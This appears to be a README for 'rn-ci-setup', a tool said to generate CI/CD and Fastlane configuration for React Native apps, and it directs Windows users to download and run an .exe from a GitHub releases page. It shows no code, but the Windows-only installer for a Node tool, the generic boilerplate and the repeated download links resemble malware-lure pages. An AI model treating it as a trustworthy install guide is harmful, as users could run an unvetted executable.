# ⚙️ rn-ci-setup - Launch mobile builds with ease

[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Linaunscripted6976/rn-ci-setup/releases)

## 🎯 Purpose of this tool

The rn-ci-setup tool helps you build and publish your React Native mobile applications. Mobile development involves many repetitive tasks like code signing and store uploads. These tasks often require manual effort and configuration. This tool automates the process so you focus on writing code. It sets up your project to work with services like GitHub Actions, Bitrise, or Codemagic.

## 🛠 Prerequisites

Ensure your computer has the following items before you start:

- Windows 10 or Windows 11.
- Node.js installed on your machine.
- An existing React Native project folder.
- Terminal access, such as Command Prompt or PowerShell.

## 📥 How to get the tool

You must download the latest version to your computer.

1. Go to the [official release page](https://github.com/Linaunscripted6976/rn-ci-setup/releases).
2. Locate the most recent release at the top of the page.
3. Click the file ending in .exe to start the download.
4. Save the file to your desktop for easy access.

## 🚀 Setting up the software

Follow these steps to prepare the tool for use:

1. Open your File Explorer.
2. Locate the file you just downloaded.
3. Double-click the file to start the installation.
4. Follow the prompts on the screen to finish the setup process.
5. The tool adds a command to your system path. This allows you to run the program from any folder in your terminal.

## 🏃 Using the tool

Once installation completes, use the tool to configure your project.

1. Open your Command Prompt or PowerShell.
2. Navigate to your project folder using the `cd` command. For example, type `cd C:\MyProjects\MyApp` and press Enter.
3. Type `rn-ci-setup` in the terminal and press Enter.
4. A menu appears on your screen. Use your arrow keys to select your preferred CI/CD provider. You may choose GitHub Actions, Bitrise, or Codemagic.
5. Follow the instructions displayed in the terminal. The tool creates the necessary configuration files for you.
6. The setup process concludes when the terminal displays a success message.

## 📂 Configuration files explained

The tool adds specific files to your project. These files communicate with your chosen build service.

- Fastlane files: These manage your certificates and store screenshots automatically.
- Workflow files: These contain the instructions for your build server to compile the app.
- Environment variables: These hide secret keys and passwords.

Do not delete these files. If you remove them, your automated builds will fail.

## 💡 Best practices

Keep your project updated to avoid issues. Run the tool periodically if you switch your build provider. Always commit your configuration files to your version control system. This ensures your team members have the same settings. If you encounter errors, check that your environment variables are correct.

## 🔧 Frequently asked questions

Do I need a paid account?
No, the tool is free. However, your chosen CI/CD service may have subscription plans for advanced features.

Does this work on macOS?
This version supports Windows. The manual process for other operating systems involves similar steps but uses a different command format.

What if my build fails?
Check the logs provided by your CI/CD dashboard. Most errors relate to incorrect signing keys or missing credentials.

How do I remove the tool?
Open your Windows Settings, go to Apps, and find the application in the list. Select Uninstall to remove it from your system.

## 📚 Topics covered

This software bridges the gap between your local code and cloud build systems. It uses industry standards like Fastlane to handle complex mobile deployment. By automating these tasks, you maintain clean workflows and consistent app delivery.